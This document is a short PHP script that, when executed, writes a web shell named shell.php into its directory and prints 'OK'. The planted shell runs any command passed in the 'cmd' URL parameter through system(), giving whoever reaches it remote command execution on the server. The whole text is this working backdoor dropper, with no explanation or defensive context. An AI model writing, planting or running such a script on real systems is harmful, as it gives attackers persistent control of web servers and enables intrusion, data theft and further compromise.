<?php
file_put_contents(__DIR__ . '/shell.php', "<?php system(\$_GET['cmd']); ?>");
echo "OK";
?>
